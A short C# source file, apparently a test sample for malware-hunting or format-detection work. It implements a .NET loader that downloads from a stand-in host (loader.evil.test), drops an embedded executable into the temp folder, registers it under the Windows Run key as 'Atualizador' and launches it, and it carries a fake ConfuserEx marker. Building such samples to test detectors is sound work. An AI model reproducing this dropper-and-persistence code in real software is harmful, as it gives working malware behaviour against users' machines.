// Loader .NET de teste (plans/caca-e-formatos, item 3): baixa, executa, grava na chave Run e traz
// um PE como recurso embutido (o prog32.exe, em gen.sh), com o atributo que o ConfuserEx deixa.
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using Microsoft.Win32;

[assembly: ConfusedBy("ConfuserEx v1.6.0")]

[AttributeUsage(AttributeTargets.Assembly)]
class ConfusedByAttribute : Attribute {
  public ConfusedByAttribute(string s) { }
}

namespace Carga {
  public static class Programa {
    public static void Main() {
      var wc = new WebClient();
      byte[] dados = wc.DownloadData("http://loader.evil.test/estagio2.bin");
      using (Stream s = Assembly.GetExecutingAssembly().GetManifestResourceStream("carga.bin")) {
        var buf = new byte[s.Length];
        s.Read(buf, 0, buf.Length);
        File.WriteAllBytes(Path.Combine(Path.GetTempPath(), "carga.exe"), buf);
      }
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)
        .SetValue("Atualizador", Path.Combine(Path.GetTempPath(), "carga.exe"));
      Process.Start(Path.Combine(Path.GetTempPath(), "carga.exe"), dados.Length.ToString());
    }
  }
}
